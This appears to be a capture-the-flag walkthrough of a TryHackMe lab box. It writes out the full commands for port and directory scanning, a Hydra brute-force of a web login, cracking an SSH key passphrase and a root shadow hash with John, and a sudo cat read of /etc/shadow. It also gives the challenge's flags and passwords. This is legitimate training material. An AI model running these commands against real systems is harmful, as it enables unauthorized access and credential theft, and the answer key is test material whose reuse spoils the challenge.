# Brute It

## About The Box
The box is about Brute-force, Hash cracking, Privilege escalation.

## Reconnaissance 

### How many ports are open?
Using nmap, we can found a lot about our target. 
```
  nmap -sV <target-ip>
```
As we can see, **two ports** are open. 

### What version of SSH is running?
The -sV flag shows the the service version: **OpenSSH 7.6p1**


### What version of Apache is running?
**2.4.29**

### Which Linux distribution is running?
**Ubuntu**

### Search for hidden directories on web server.
### What is the hidden directory?
We can find directories on webserver with help of [gobuster](https://www.kali.org/tools/gobuster/).
Gobuster requires the ip address of the target and a wordlist.
```gobuster -u 10.10.196.80 -w known_directory_names```
Following are the results of the command:
1. /.htaccess (Status: 403)
2. /admin (Status: 301)
3. /.htpasswd (Status: 403)
4. /.htpasswds (Status: 403)
Besides **/admin**, everything else is 403. 

Now we can go to the admin page -> ip-address/admin. 

##  Getting a shell 
Now we have to login as admin. To find the username, inspect the website. There is a comment telling the user John, that the admin username is **admin**.
To find the password, I first used [burp-suite intruder](https://portswigger.net/burp/communitydownload). But it wasn't successful. Then I used [Hydra](https://www.kali.org/tools/hydra/).
```hydra -l admin -P rockyou.txt 10.10.196.80 http-post-form "/admin/:user=admin&pass=^PASS^:Username or password invalid"```
Using hydra, we get the password: **xavier**.

### Crack the RSA key you found.
### What is John's RSA Private Key passphrase?
After using the credential, you use the flag **THM{brut3_f0rce_is_e4sy}** and a file. Download the file. 
Use [ssh2jonh](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py) to generate the hash. 
``` python3 ssh2john.py ~/TryHackMe/RSA_KEY > hash.txt```
Now with ``` john hash.txt rockyou.txt ```, we get the passphrase for john: **rockinroll**. 
We can now ssh: ```ssh -i RSA_KEY john@ip-address```. 
### user.txt
There we find user.txt containing the flag: **THM{a_password_is_not_a_barrier}**

### Web flag
**THM{brut3_f0rce_is_e4sy}**

## Privilege Escalation
### Find a form to escalate your privileges.
### What is the root's password?

Now we are connected to the remote server using Johns creds, it's time to get the root privileges on this machine. 
Use ```sudo -l``` to see which commands can John execute as root.
**User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat**
Go to [GTFOBins](https://gtfobins.github.io/gtfobins/cat/) to see how we can run the cat command to get root privileges. 
Remember that the passwords on Linux are stored in shadow file. If you try to access ```cat /etc/shadow ```, you will recieve permission denied error.
Set ```LFILE=/etc/shadow``` and then ```sudo cat $LFILE```.
You will see the hashes now. Copy the hash of root and store it in a file locally.  
``` john root_pass.txt rockyou.txt ``` 

Root password: **football**

### root.txt
su -> cat root.txt: **THM{pr1v1l3g3_3sc4l4t10n}**
